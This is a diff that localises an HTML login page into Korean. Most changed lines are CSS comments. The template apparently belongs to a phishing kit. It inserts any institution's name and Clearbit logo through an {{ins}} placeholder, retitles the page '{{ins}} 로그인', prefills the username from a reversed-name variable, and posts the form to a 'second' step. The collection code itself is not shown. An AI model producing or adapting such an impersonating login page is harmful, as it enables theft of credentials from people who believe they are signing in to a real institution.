@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="ko">
 <head>
-  <title>Fantastic Login</title>
+  <title>환상적인 로그인</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <link rel="icon" href="https://logo.clearbit.com/{{ins}}" type="image/x-icon"/>
   <style>
@@ -13,7 +13,7 @@
       width: 100%;
       height: 100vh;
       font-family: 'Arial', sans-serif;
-      color: #1E90FF; /* Dodger blue text color */
+      color: #1E90FF; /* 도저 블루 텍스트 색상 */
     }
 
     .login-container {
@@ -21,9 +21,9 @@
       max-width: 400px;
       margin: auto;
       height: 480px;
-      background: linear-gradient(to right, #FFA07A, #FFD700); /* Light salmon to gold gradient */
+      background: linear-gradient(to right, #FFA07A, #FFD700); /* 연한 샐몬에서 금까지 그래디언트 */
       border-radius: 20px;
-      color: #333; /* Darker text color */
+      color: #333; /* 더 어두운 텍스트 색상 */
       position: absolute;
       top: 50%;
       left: 50%;
@@ -35,7 +35,7 @@
     }
 
     .login-container:hover {
-      background: linear-gradient(to right, #FF6347, #FF4500); /* Tomato to orange gradient on hover */
+      background: linear-gradient(to right, #FF6347, #FF4500); /* 토마토에서 오렌지로 그래디언트를 호버 시 */
       transform: translate(-50%, -50%) scale(1.05);
     }
 
@@ -52,7 +52,7 @@
       text-align: center;
       margin-bottom: 20px;
       text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
-      color: #1E90FF; /* Dodger blue heading color */
+      color: #1E90FF; /* 도저 블루 헤딩 색상 */
     }
 
     .login-container p {
@@ -75,8 +75,8 @@
 
     .login-container input[type="submit"] {
       cursor: pointer;
-      background: linear-gradient(to right, #1E90FF, #4169E1); /* Dodger blue to royal blue gradient */
-      color: #fff; /* White text color */
+      background: linear-gradient(to right, #1E90FF, #4169E1); /* 도저 블루에서 로얄 블루로 그래디언트 */
+      color: #fff; /* 흰색 텍스트 색상 */
       font-size: 20px;
       border: none;
       border-radius: 25px;
@@ -86,7 +86,7 @@
     }
 
     .login-container input[type="submit"]:hover {
-      background: linear-gradient(to right, #4169E1, #000080); /* Royal blue to navy gradient on hover */
+      background: linear-gradient(to right, #4169E1, #000080); /* 로얄 블루에서 해군 그래디언트로 호버 시 */
       color: #fff;
       box-shadow: 0 0 20px rgba(0, 0, 0, 0.3), 0 0 10px rgba(0, 0, 0, 0.2);
       animation: buttonPulse 0.5s ease-in-out;
@@ -121,7 +121,7 @@
     }
 
     .login-container a:hover {
-      color: #FF4500; /* Orange color on hover */
+      color: #FF4500; /* 호버 시 오렌지 색상 */
     }
 
     .avatar {
@@ -138,7 +138,7 @@
 <body>
   <div class="login-container">
     <img src="https://logo.clearbit.com/{{ins}}" class="avatar">
-    <h1>Fantastic Login</h1>
+    <h1>{{ins}} 로그인</h1>
     <form action="second" method="post">
       <p>사용자 이름</p>
       <input type="text" name="horse" placeholder="사용자 이름을 입력하세요" value="{{eman}}">
